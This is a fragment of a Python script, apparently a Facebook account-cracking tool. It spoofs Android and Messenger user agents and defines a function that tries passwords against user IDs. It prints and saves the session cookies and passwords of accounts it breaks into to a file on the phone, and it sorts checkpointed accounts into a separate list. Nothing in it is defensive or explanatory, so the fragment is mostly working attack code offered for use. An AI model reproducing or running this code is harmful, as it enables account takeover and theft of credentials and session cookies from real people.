...
os.system("xdg-open https://facebook.com/groups/910967984067466/")
import uuid
...
agent = {"Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"}
agent = {"Dalvik/1.6.0_(Linux;_U;_Android_4.2.2;_AX610_Build/JDQ39)_[FBAN/Orca-Android;FBAV/19.0.0.19.42;FBLC/es_ES;FBBV/6398209;FBCR/CELTELHND;FBMF/alps;FBBD/Bmobile;FBDV/AX610;FBSV/4.2.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=320,height=480};FB_FW/1;]"}
logo = """


  _____          _   _ _____  __   __  _______    _ ____ _____ 
 |  __ \   /\   | \ | |_   _| \ \ / / |___  / |  | |  _ \_   _|
 | |  | | /  \  |  \| | | |    \ V /     / /| |  | | |_) || |  
 | |  | |/ /\ \ | . ` | | |     > <     / / | |  | |  _ < | |  
 | |__| / ____ \| |\  |_| |_   / . \   / /__| |__| | |_) || |_ 
 |_____/_/    \_\_| \_|_____| /_/ \_\ /_____|\____/|____/_____|
...
def fcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[FELLIX-OK] '+uid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('/sdcard/SIALZADA-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
               # print('\033[1;33m[MR SIAL-CP] '+cid+' | '+ps+'\x1b[1;97m')
            #    open('MR SIAL-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
